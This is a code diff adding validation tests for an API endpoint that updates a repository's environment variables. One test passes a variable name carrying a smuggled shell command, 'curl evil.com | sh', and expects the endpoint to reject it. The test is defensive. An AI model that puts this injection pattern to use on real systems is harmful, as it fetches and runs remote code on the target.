@@ -73,6 +73,31 @@ describe("PATCH /api/user/repo-env", () => {
     expect(res.status).toBe(400)
   })
 
+  it("rejects a variable name with a shell metacharacter, naming the offending key", async () => {
+    const res = await PATCH(
+      makeRequest({
+        repo: "acme/app",
+        environmentVariables: { "X; curl evil.com | sh; Y": "1" },
+      })
+    )
+    const body = await res.json()
+
+    expect(res.status).toBe(400)
+    expect(body.error).toContain("X; curl evil.com | sh; Y")
+    expect(environment.update).not.toHaveBeenCalled()
+  })
+
+  it("rejects a variable name starting with a digit", async () => {
+    const res = await PATCH(
+      makeRequest({ repo: "acme/app", environmentVariables: { "9FOO": "1" } })
+    )
+    const body = await res.json()
+
+    expect(res.status).toBe(400)
+    expect(body.error).toContain("9FOO")
+    expect(environment.update).not.toHaveBeenCalled()
+  })
+
   it("round-trips values through encrypt/decrypt against the repo's default environment", async () => {
     environment.findFirst.mockResolvedValueOnce({
       id: "env1",
